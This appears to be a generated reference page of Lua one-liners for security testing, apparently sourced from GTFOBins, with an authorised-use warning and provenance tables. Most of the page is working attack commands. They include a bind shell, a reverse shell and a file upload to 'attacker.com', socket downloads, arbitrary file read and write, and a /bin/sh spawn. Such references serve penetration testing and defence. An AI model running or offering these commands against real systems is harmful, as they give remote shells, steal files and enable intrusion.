---
parsed_by: focuslocust
source: commands
type: generated
---
# lua Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## lua

Tool page: [lua](../../tools/linux/lua.md)

### bind-shell

```text
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### download

```text
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("/path/to/output-file", "wb");
  f:write(d);
  io.close(f);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### shell

```text
lua -e 'os.execute("/bin/sh")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |

### upload

```text
lua -e '
  local f=io.open("/path/to/input-file", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("attacker.com",12345);
  t:send(d);
  t:close();'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/lua` |
| Evidence | Function example preserved from source parser. |
